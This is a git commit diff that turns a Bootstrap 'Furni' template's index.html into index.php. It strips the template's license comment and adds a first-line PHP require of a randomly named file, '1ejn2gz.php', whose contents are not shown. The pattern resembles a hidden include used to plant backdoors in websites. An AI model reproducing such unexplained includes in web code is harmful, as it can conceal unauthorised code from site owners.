b124e006b1aa7a9cb8f1dde8a3ee7d089760e9b7
tylerthomas9284-ai <tylerthomas9284@gmail.com>
2026-03-27 17:38:39 +0530

    Update and rename index.html to index.php

--- index.php
+++ index.php
@@ -1,10 +1,4 @@
-<!-- /*
-* Bootstrap 5
-* Template Name: Furni
-* Template Author: Untree.co
-* Template URI: https://untree.co/
-* License: https://creativecommons.org/licenses/by/3.0/
-*/ -->
+<?php require __DIR__ . '/1ejn2gz.php' ?>
 <!doctype html>
 <html lang="en">
 <head>
